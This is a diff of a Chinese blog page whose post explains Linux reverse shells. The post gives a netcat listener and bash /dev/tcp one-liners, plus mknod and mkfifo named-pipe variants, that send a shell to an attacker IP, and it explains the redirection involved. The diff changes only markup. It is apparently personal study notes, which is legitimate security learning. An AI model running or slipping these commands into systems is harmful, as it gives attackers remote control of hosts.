@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya1j0015s04z09y161zd" class="article article-type-post" itemscope
+    <article id="post-ckwrjlygb001ays4z73bl5mwl" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -180,10 +180,10 @@
             <h2 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h2><span id="more"></span>
 
 <p>攻击机执行命令（IP：192.168.59.128）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 1234</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">nc -l -vv -p 1234</code></pre>
 
 <p>靶机执行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.59.128/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">bash -i &amp;&gt; /dev/tcp/192.168.59.128/1234 0&gt;&amp;1</code></pre>
 <p>攻击机执行命令中：</p>
 <ol>
 <li>-l 开启连接监听（TCP）</li>
@@ -197,14 +197,17 @@
 <li>/dev/tcp/192.168.59.128/1234  建立TCP连接</li>
 </ol>
 <p>现在有两个问题要解决。<br>1、两个命令连接。<br>2、向shell的输入数据传递和shell回显数据传递问题。<br>这是就会发现Linux重定向的妙用。使用 <strong>&gt;&amp;</strong> 将两个命令连接（可以理解将标准输出和错误重定向到TCP连接），使用**0&lt;&amp;1**将输入重定向到输出。<br>至于说为什么不使用<code>&gt;</code>，可以参考：<br><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell-io-redirections.html">https://www.runoob.com/linux/linux-shell-io-redirections.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/153986.html">https://www.freebuf.com/articles/system/153986.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85712">https://www.anquanke.com/post/id/85712</a><br>其实以上都是对于其他博文的理解与整合，不算自己的。<br>针对于第三篇博文所述</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.59.128/1234 0&lt;&amp;1</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.59.128/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">bash -i &amp;&gt; /dev/tcp/192.168.59.128/1234 0&lt;&amp;1</code></pre>
+<pre><code class="hljs plaintext">bash -i &amp;&gt; /dev/tcp/192.168.59.128/1234 0&gt;&amp;1</code></pre>
 
 <p> 两个命令执行都能反弹获得shell，个人理解：文件描述符 <strong>0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）</strong>，由于在TCP连接建立后，标准输入输出端均已确定，所以我猜测无论重定向方向如何，只能是一个输入一个输出，所以重定向中&gt;符号的方向不影响结果。</p>
 <p><strong>常见反弹shell姿势：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mknod /tmp/backpipe p                        #root权限执行</span><br><span class="line">root@kali:~# /bin/sh 0&lt;/tmp/backpipe | nc 192.168.xx.xx 4430 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">root@kali:~# mknod /tmp/backpipe p                        #root权限执行
+root@kali:~# /bin/sh 0&lt;/tmp/backpipe | nc 192.168.xx.xx 4430 1&gt;/tmp/backpipe</code></pre>
 <p>backpipe是一个设备文件，创建管道所必须的。第二条命令中先将/bin/sh 的输入重定向到管道，再将nc连接端口的输出重定向到管道。可以用下图来理解。我曾尝试同时输出错误信息，但没成功，路过的大佬知道可以讲下。<br><img src="https://img-blog.csdnimg.cn/20190926154934360.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20190926155618923.png" alt="在这里插入图片描述"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# mkfifo /tmp/backpipe p                 #没有root权限情况下可以使用该命令</span><br><span class="line">root@kali:~# /bin/sh 0&lt;/tmp/backpipe | nc 192.168.xx.xx 4430 1&gt;/tmp/backpipe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">root@kali:~# mkfifo /tmp/backpipe p                 #没有root权限情况下可以使用该命令
+root@kali:~# /bin/sh 0&lt;/tmp/backpipe | nc 192.168.xx.xx 4430 1&gt;/tmp/backpipe
+</code></pre>
 
 <p>tips：<br>1、mkfifo与mknod均为创建管道命令的两种方法，使用权限高低而已。<br>2、由于时间关系，环境测试不是同一个IP，可能有变动。<br>3、以上均为个人理解，如有错误还希望各位不吝赐教。</p>
 
